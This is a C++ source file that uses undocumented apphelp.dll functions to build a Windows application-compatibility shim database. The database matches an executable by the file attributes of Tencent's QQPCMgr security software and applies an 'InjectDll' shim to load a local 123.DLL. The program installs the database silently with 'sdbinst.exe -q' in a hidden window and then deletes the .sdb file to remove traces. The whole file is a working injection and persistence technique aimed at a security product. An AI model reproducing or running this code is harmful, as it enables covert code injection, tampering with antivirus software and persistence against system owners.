// shimtest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include"windows.h"
#include"iostream"
using namespace std;
typedef DWORD TAG,TAGID,INDEXID;
typedef HANDLE PDB;
typedef enum _PATH_TYPE
{
	DOS_PATH,
	NT_PATH
}PATH_TYPE;
typedef struct tagATTRINFO
{
	TAG tAttrID;
	DWORD dwFlags;
	union
	{
		ULONGLONG ullAttr;
		DWORD dwAttr;
		WCHAR *lpAttr;
	};
}ATTRINFO, *PATTRINFO;
int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hModule = 0;
	hModule = LoadLibrary(L"apphelp.dll");
	if (hModule == 0)
	{
		cout << "Load Error!" << endl;
		return 0;
	}
	typedef ULONGLONG(__stdcall* MakeKey)(LPCTSTR);
	MakeKey SdbMakeIndexKeyFromString = (MakeKey)GetProcAddress(hModule, "SdbMakeIndexKeyFromString");
	ULONGLONG Key1 = SdbMakeIndexKeyFromString(L"hyabcd1");/*5213269796510249216*/
	ULONGLONG Key2=SdbMakeIndexKeyFromString(L"hyabcd2");
	ULONGLONG Key3 = SdbMakeIndexKeyFromString(L"PCtray.exe");/*333630545241592e*/
	typedef PDB(__stdcall* CreateSdb)(LPWSTR, PATH_TYPE);
	CreateSdb SdbCreateDatabase = (CreateSdb)GetProcAddress(hModule, "SdbCreateDatabase");
	typedef PDB(__stdcall* CreateSdb)(LPWSTR, PATH_TYPE);
	WCHAR path[MAX_PATH] = { 0 };
	GetCurrentDirectory(MAX_PATH, path);
	wcscat_s(path, MAX_PATH, L"\\Test.sdb");
	PDB sdbHandle = SdbCreateDatabase(path, DOS_PATH);
	if (sdbHandle == 0)
	{
		cout << "Createsdb Error!" << endl;
		cout << GetLastError();
	}
	typedef BOOL(__stdcall* DeclareIndex)(PDB, TAG, TAG, DWORD, BOOL, INDEXID*);
	DeclareIndex SdbDeclareIndex = (DeclareIndex)GetProcAddress(hModule, "SdbDeclareIndex");
	BOOL TorF = FALSE;
	DWORD DeclareEXEID = 0;
	typedef BOOL(__stdcall* GetFileAttr)(LPCTSTR, PATTRINFO*, LPDWORD);
	DWORD dwAttrCount = 0;
	GetFileAttr SdbGetFileAttributes = (GetFileAttr)GetProcAddress(hModule, "SdbGetFileAttributes");
	SdbGetFileAttributes(L"C:\\Program Files (x86)\\Tencent\\QQPCMgr\\12.2.18340.225\\QQPCMgr.exe", 0, &dwAttrCount);
	PATTRINFO attrinfo = (PATTRINFO)malloc(sizeof(ATTRINFO)*dwAttrCount);
	SdbGetFileAttributes(L"C:\\Program Files (x86)\\Tencent\\QQPCMgr\\12.2.18340.225\\QQPCMgr.exe", &attrinfo, &dwAttrCount);
	TorF = SdbDeclareIndex(sdbHandle, 0x7007, 0x6001, 1, 1, &DeclareEXEID);/*0*/
	DWORD DeclareWildCardID = 0;
	TorF = SdbDeclareIndex(sdbHandle, 0x7007, 0x600b, 0, 0, &DeclareWildCardID);/*1*/
	DWORD Declare16ModuleID = 0;
	TorF = SdbDeclareIndex(sdbHandle, 0x7007, 0x6020, 0, 0, &Declare16ModuleID);/*2*/
	DWORD DeclareShimID = 0;
	TorF = SdbDeclareIndex(sdbHandle, 0x7004, 0x6001, 0, 0, &DeclareShimID);/*3*/
	DWORD DeclareHtmlHelpID = 0;
	TorF = SdbDeclareIndex(sdbHandle, 0x700D, 0x4015, 0, 0, &DeclareHtmlHelpID);/*4*/
	DWORD DeclareMSITransform = 0;
	TorF = SdbDeclareIndex(sdbHandle, 0x7010, 0x6001, 0, 1, &DeclareMSITransform);/*5*/
	DWORD DeclareMSIPackageID = 0;
	TorF = SdbDeclareIndex(sdbHandle, 0x7012, 0x9006, 0, 0, &DeclareMSIPackageID);/*6*/
	DWORD DeclareMSIPackageExeID = 0;
	TorF = SdbDeclareIndex(sdbHandle, 0x7012, 0x9004, 0, 1, &DeclareMSIPackageExeID);/*7*/
	DWORD DeclaretTagExeID = 0;
	TorF = SdbDeclareIndex(sdbHandle, 0x7007, 0x9004, 1, 0, &DeclaretTagExeID);/*8*/
	typedef BOOL(__stdcall* CommitDeclare)(PDB);
	CommitDeclare SdbCommitIndexes = (CommitDeclare)GetProcAddress(hModule, "SdbCommitIndexes");
	TorF = SdbCommitIndexes(sdbHandle);
	typedef TAGID(__stdcall* BeginWrite)(PDB, TAG);
	BeginWrite SdbBeginWriteListTag = (BeginWrite)GetProcAddress(hModule, "SdbBeginWriteListTag");
	TAGID TagDatabase = SdbBeginWriteListTag(sdbHandle, 0x7001);/*f0*/
	LPFILETIME FileTime = (LPFILETIME)malloc(sizeof(LPFILETIME));
	GetSystemTimeAsFileTime(FileTime);
	typedef BOOL(__stdcall* WriteQWORD)(PDB, TAG, ULONGLONG);
	WriteQWORD SdbWriteQWORDTag = (WriteQWORD)GetProcAddress(hModule, "SdbWriteQWORDTag");
	ULONGLONG Time = (((ULONGLONG)(FileTime->dwHighDateTime))<< 32)+FileTime->dwLowDateTime;
	TorF = SdbWriteQWORDTag(sdbHandle, 0x5001,Time );/*BFD4597501D22C3D*/
	typedef BOOL(__stdcall* WriteString)(PDB, TAG, LPCWSTR);
	WriteString SdbWriteStringTag = (WriteString)GetProcAddress(hModule, "SdbWriteStringTag");
	TorF = SdbWriteStringTag(sdbHandle, 0x6022, L"2.1.0.3");
	TorF = SdbWriteStringTag(sdbHandle, 0x6001, L"databasename");
	typedef BOOL(__stdcall* WriteDword)(PDB, TAG, DWORD);
	WriteDword SdbWriteDWORDTag = (WriteDword)GetProcAddress(hModule, "SdbWriteDWORDTag");
	DWORD OSVer = 0x1;
	TorF = SdbWriteDWORDTag(sdbHandle, 0x4023, OSVer);
	GUID SdbGUID = { 0x3c1f84e1, 0x4f75, 0x2392, { 0x72, 0x4f, 0x6c, 0x90, 0x27, 0x4e, 0x7e, 0x60 } };
	typedef BOOL(__stdcall* WriteBin)(PDB, TAG, PBYTE, DWORD);
	WriteBin SdbWriteBinaryTag = (WriteBin)GetProcAddress(hModule, "SdbWriteBinaryTag");
	TorF = SdbWriteBinaryTag(sdbHandle, 0x9007, (PBYTE)&SdbGUID, 0x10);
	TAGID TagLibrary = SdbBeginWriteListTag(sdbHandle, 0x7002);/*128*/
	typedef BOOL(__stdcall*StartIndex)(PDB, INDEXID);
	StartIndex SdbStartIndexing = (StartIndex)GetProcAddress(hModule, "SdbStartIndexing");
	SdbStartIndexing(sdbHandle, DeclareShimID);
	typedef BOOL(__stdcall*StopIndex)(PDB, INDEXID);
	StopIndex SdbStopIndexing = (StopIndex)GetProcAddress(hModule, "SdbStopIndexing");
	SdbStopIndexing(sdbHandle, DeclareShimID);
	SdbStartIndexing(sdbHandle, DeclareMSITransform);
	SdbStopIndexing(sdbHandle, DeclareMSITransform);
	typedef BOOL(__stdcall* EndWrite)(PDB, TAGID);
	EndWrite SdbEndWriteListTag = (EndWrite)GetProcAddress(hModule, "SdbEndWriteListTag");
	TorF = SdbEndWriteListTag(sdbHandle, TagLibrary);
	SdbStartIndexing(sdbHandle, DeclareWildCardID);
	SdbStopIndexing(sdbHandle, DeclareWildCardID);
	SdbStartIndexing(sdbHandle, Declare16ModuleID);
	SdbStopIndexing(sdbHandle, Declare16ModuleID);
	SdbStartIndexing(sdbHandle, DeclareEXEID);
	SdbStartIndexing(sdbHandle, DeclaretTagExeID);
	TAGID TagExeID = SdbBeginWriteListTag(sdbHandle, 0x7007);/*12e*/
	TorF = SdbWriteStringTag(sdbHandle, 0x6001, L"test.exe");
	TorF = SdbWriteStringTag(sdbHandle, 0x6006, L"hyabcd1");
	TorF = SdbWriteStringTag(sdbHandle, 0x6005, L"hyabcd2");
	GUID ExeID = { 0x238c0aab, 0x0cbf, 0x4cd6, { 0xc6, 0x54, 0x6e, 0x8c, 0x6e, 0xbd, 0x0f, 0x97 } };
	TorF = SdbWriteBinaryTag(sdbHandle, 0x9004, (PBYTE)&ExeID, 0x10);
	TAGID TagMatchFile = SdbBeginWriteListTag(sdbHandle, 0x7008);/*15c*/
	TorF = SdbWriteStringTag(sdbHandle, 0x6001, L"*");
	for (int i = 0; i < dwAttrCount; i++)
	{
		if (attrinfo[i].tAttrID == 0x6009)
			SdbWriteStringTag(sdbHandle, 0x6009, attrinfo[i].lpAttr);
		if (attrinfo[i].tAttrID == 0x6010)
			SdbWriteStringTag(sdbHandle, 0x6010, attrinfo[i].lpAttr);
		if (attrinfo[i].tAttrID == 0x6011)
			SdbWriteStringTag(sdbHandle, 0x6011, attrinfo[i].lpAttr);
		if (attrinfo[i].tAttrID == 0x5002)
			SdbWriteQWORDTag(sdbHandle, 0x5002, attrinfo[i].ullAttr);
		if (attrinfo[i].tAttrID == 0x5003)
			SdbWriteQWORDTag(sdbHandle, 0x5003, attrinfo[i].ullAttr);
		if (attrinfo[i].tAttrID == 0x6013)
			SdbWriteStringTag(sdbHandle, 0x6013, attrinfo[i].lpAttr);
	}
	typedef BOOL(__stdcall* FreeFileAttr)(PATTRINFO*);
	FreeFileAttr SdbFreeFileAttributes = (FreeFileAttr)GetProcAddress(hModule, "SdbFreeFileAttributes");
	SdbFreeFileAttributes(&attrinfo);
	TorF = SdbEndWriteListTag(sdbHandle, TagMatchFile);
	TAGID TagShim = SdbBeginWriteListTag(sdbHandle, 0x7009);/*194*/
	TorF = SdbWriteStringTag(sdbHandle, 0X6001, L"InjectDll");/*ShimName*/
	WCHAR dir[MAX_PATH] = { 0 };
	GetCurrentDirectory(MAX_PATH,dir);
	wcscat_s(dir,MAX_PATH, L"\\123.DLL");
	TorF = SdbWriteStringTag(sdbHandle, 0X6008, dir);
	TorF = SdbEndWriteListTag(sdbHandle, TagShim);
	TorF = SdbEndWriteListTag(sdbHandle, TagExeID);
	SdbStopIndexing(sdbHandle, DeclaretTagExeID);
	SdbStopIndexing(sdbHandle, DeclareEXEID);
	SdbStartIndexing(sdbHandle, DeclareMSIPackageID);
	SdbStartIndexing(sdbHandle, DeclareMSIPackageExeID);
	SdbStopIndexing(sdbHandle, DeclareMSIPackageExeID);
	SdbStopIndexing(sdbHandle, DeclareMSIPackageID);
	SdbStartIndexing(sdbHandle, DeclareHtmlHelpID);
	SdbStopIndexing(sdbHandle, DeclareHtmlHelpID);
	TorF = SdbEndWriteListTag(sdbHandle, TagDatabase);
	typedef void(__stdcall*CloseWrite)(PDB);
	CloseWrite SdbCloseDatabaseWrite = (CloseWrite)GetProcAddress(hModule, "SdbCloseDatabaseWrite");
	SdbCloseDatabaseWrite(sdbHandle);
	typedef void(__stdcall* CloseSdb)(PDB);
	CloseSdb SdbCloseDatabase = (CloseSdb)GetProcAddress(hModule, "SdbCloseDatabase");
	char Sdbpath[MAX_PATH] = { 0 };
	GetCurrentDirectoryA(MAX_PATH, Sdbpath);
	string name1 = "\\Test.sdb";
	string para1 = Sdbpath + name1;
	string name2 = "sdbinst.exe -q ";
	string cmdline1 = name2 + "\"" + para1 + "\"";
	WinExec(cmdline1.c_str(), SW_HIDE);
	Sleep(3000);
	WCHAR CurrentPath[MAX_PATH] = { 0 };
	GetCurrentDirectory(MAX_PATH, CurrentPath);
	wcscat_s(CurrentPath, MAX_PATH, L"\\Test.sdb");
	DeleteFile(CurrentPath);
	return 0;
}

